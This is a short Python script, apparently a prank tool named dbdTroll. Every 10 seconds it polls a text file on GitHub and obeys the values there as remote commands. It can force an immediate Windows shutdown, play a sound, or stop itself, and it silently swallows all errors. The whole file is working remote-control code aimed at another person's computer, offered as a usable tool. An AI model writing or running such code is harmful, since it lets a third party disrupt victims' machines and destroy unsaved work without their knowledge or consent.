import os
import requests
import time
import requests
from bs4 import BeautifulSoup
import json
import getpass
# pip: pygame

userDevice = getpass.getuser()
filePath = "C:/Users/" + userDevice + "/dbdT/files-main/"
configPath = filePath + "config.json"
soundPath = filePath + "sound.mp3"

def writeDate(source, value):
    with open(configPath) as file:
        data = json.load(file)
    data[source] = value
    with open(configPath, "w+") as newfile:
        json.dump(data, newfile, indent=4)
    file.close()
    newfile.close()

def readDate():
    with open(configPath) as file:
        data = json.load(file)
    file.close()
    return data

run = True
while run:
    time.sleep(10)
    try:
        reqUrl = requests.get('https://raw.githubusercontent.com/iveRasinski/dbdTroll/main/test.txt')
        data = BeautifulSoup(reqUrl.content, 'html.parser').text.replace('# ', '').replace('\n', ':').split(':')
        dates = readDate()

        if data[0] != dates["shutdown"]:
            writeDate("shutdown", data[0])
            os.system("shutdown /s /t 0")

        if data[1] != dates["sound"]:
            writeDate("sound", data[1])
            from os import environ
            environ['PYGAME_HIDE_SUPPORT_PROMPT'] = '1'
            from pygame import mixer
            mixer.init()
            mixer.music.load(soundPath)
            mixer.music.play()
            time.sleep(5)
            mixer.music.stop()

        if data[2] == "exit":
            run = False
    except:
        pass